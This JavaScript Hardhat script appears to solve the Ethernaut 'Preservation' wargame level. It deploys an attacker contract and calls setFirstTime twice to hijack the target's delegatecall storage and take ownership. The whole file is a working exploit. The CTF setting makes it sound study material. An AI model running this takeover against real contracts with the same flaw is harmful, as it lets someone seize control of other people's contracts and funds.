const {
    PRESERVATION_INSTANCE_ADDRESS,
    logStartingLevel,
    logSuccessfullyLevel,
    logInstanceAddressIsNull,
    logInstanceAddress,
    logTransactionLink
} = require('./utils');

async function main(levelName = 'Preservation') {
    logStartingLevel(levelName);

    if (!PRESERVATION_INSTANCE_ADDRESS) {
        logInstanceAddressIsNull(levelName);
        return;
    }
    logInstanceAddress(levelName, PRESERVATION_INSTANCE_ADDRESS);

    const [attacker] = await ethers.getSigners();
    const factory = await ethers.getContractFactory("Preservation");
    const contract = factory.attach(PRESERVATION_INSTANCE_ADDRESS);

    const attackerFactory = await ethers.getContractFactory("PreservationAttacker");
    const attackerContract = await attackerFactory.deploy();
    await attackerContract.deployed();

    let tx
    tx = await contract.setFirstTime(attackerContract.address);
    logTransactionLink(tx.hash);
    await tx.wait(1);

    tx = await contract.setFirstTime(attacker.address);
    logTransactionLink(tx.hash);
    await tx.wait(1);

    logSuccessfullyLevel(levelName);
}

module.exports = main;
